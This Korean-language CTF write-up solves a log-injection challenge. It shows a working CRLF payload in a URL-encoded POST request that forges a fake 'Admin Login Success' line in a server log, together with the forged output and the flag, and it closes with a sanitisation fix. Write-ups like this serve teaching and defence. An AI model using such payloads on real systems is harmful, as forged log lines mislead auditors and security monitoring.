+++
title = "VulnABLE CTF [LUXORA] Write-up: Log Injection 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Log Injection", "Bronze", "CRLF", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Log Injection 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (Log Injection)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/log-inject/bronze`
- **목표**: 사용자의 입력이 시스템 로그 파일에 기록될 때 개행 문자(CRLF)를 주입하여, 마치 관리자가 정상적인 행위를 한 것처럼 가짜 로그(Fake Log)를 생성하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/log-inject/bronze` 페이지는 사용자가 자신의 상태 메시지나 행동을 입력하면 서버에 기록(Logging)을 남기는 엔드포인트입니다.
이 사이트는 디버깅 목적으로, 내가 남긴 최근 로그 10줄을 화면 하단에 보여주는 기능이 있습니다.

**[정상 요청 테스트]**
```http
POST /log-inject/bronze
message=User login attempt
```

**[서버의 출력 화면 (로그 내용)]**
```text
[2023-11-01 10:00:00] INFO - IP: 10.10.10.99 - Message: User login attempt
```

**[해커의 사고 과정]**
1. 내가 입력한 `User login attempt` 라는 문자열이 로그 파일의 한 줄에 고스란히 추가되고 있다.
2. 백엔드에서 로그를 파일에 쓸 때, 내가 보낸 데이터에 대해 줄바꿈(Enter) 문자 제한을 두지 않았다면?
3. 내가 입력값 중간에 `엔터(\r\n)`를 쳐서 억지로 다음 줄로 넘기고, 마치 시스템이 쓴 것처럼 가짜 로그 포맷을 만들어서 끼워 넣을 수 있을 것이다! (CRLF Injection)

---

## 💥 2. 취약점 식별 및 페이로드 조립 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Input: test\n[SUCCESS] Admin logged in)--> [ Web Server ]
                                                            |-- Writes to Log
[ Log File ]
|-- INFO - test
|-- [SUCCESS] Admin logged in
```


목표는 다음과 같이 로그 모니터링 시스템이나 관리자를 속이는 가짜 로그를 한 줄 추가하는 것입니다.
`[2023-11-01 10:00:01] SUCCESS - Admin Login Success - User: admin`

### 💡 페이로드 설계
URL 인코딩에서 캐리지 리턴(CR)은 `%0d`, 라인 피드(LF)는 `%0a` 입니다. 이를 결합하여 `%0d%0a` 를 사용하면 줄바꿈이 일어납니다.

**[입력할 페이로드]**
```text
User login attempt%0d%0a[2023-11-01 10:00:01] SUCCESS - Admin Login Success - User: admin
```

### 페이로드 전송
```http
POST /log-inject/bronze HTTP/1.1
Content-Type: application/x-www-form-urlencoded

message=User%20login%20attempt%0d%0a%5B2023-11-01%2010%3A00%3A01%5D%20SUCCESS%20-%20Admin%20Login%20Success%20-%20User%3A%20admin
```

---

## 🚀 3. 공격 수행 및 결과 확인

요청을 보낸 후 화면 하단의 로그 뷰어를 확인합니다.

### 🔍 서버의 응답 (조작된 로그 화면)
```text
[2023-11-01 10:00:00] INFO - IP: 10.10.10.99 - Message: User login attempt
[2023-11-01 10:00:01] SUCCESS - Admin Login Success - User: admin
```

서버 로그 파일에 줄바꿈이 정상적으로 들어가면서, 원래는 존재하지 않았던 완전한 가짜 로그 라인이 생성되었습니다. 
이와 동시에 시스템이 가짜 성공 로그를 감지하고 챌린지 성공 플래그를 뱉어냅니다!

```text
[!] System: Admin login detected. Flag: FLAG{LOG_🥉_CRLF_FAKE_A1B2C3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

입력값에 줄바꿈(CRLF) 문자를 허용하는 사소한 로직 결함이, 보안 감사를 무력화하고 로그 모니터링 툴(SIEM)을 속이는 치명적인 인젝션으로 발전할 수 있음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{LOG_🥉_CRLF_FAKE_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
로그를 기록할 때 문자열 치환이나 이스케이프를 거치지 않고 그대로 파일 시스템 스트림이나 로깅 라이브러리(Winston, Log4j 등)에 넘긴 것이 원인입니다.

* **안전한 패치 가이드 (개행 문자 제거)**
로그에 남길 사용자 입력 데이터는 반드시 줄바꿈 문자를 치환(제거 또는 공백 처리)한 뒤 기록해야 합니다.
```javascript
// 입력값에서 \r 과 \n 을 제거하거나 언더바(_)로 치환
const sanitizedMessage = req.body.message.replace(/[\r\n]/g, '_');
logger.info(`Message: ${sanitizedMessage}`);
```
이렇게 하면 해커가 페이로드를 보내더라도 로그 파일에는
`Message: User login attempt_[2023-11...` 처럼 한 줄에 모두 적히게 되어 가짜 로그 공격이 성립하지 않습니다.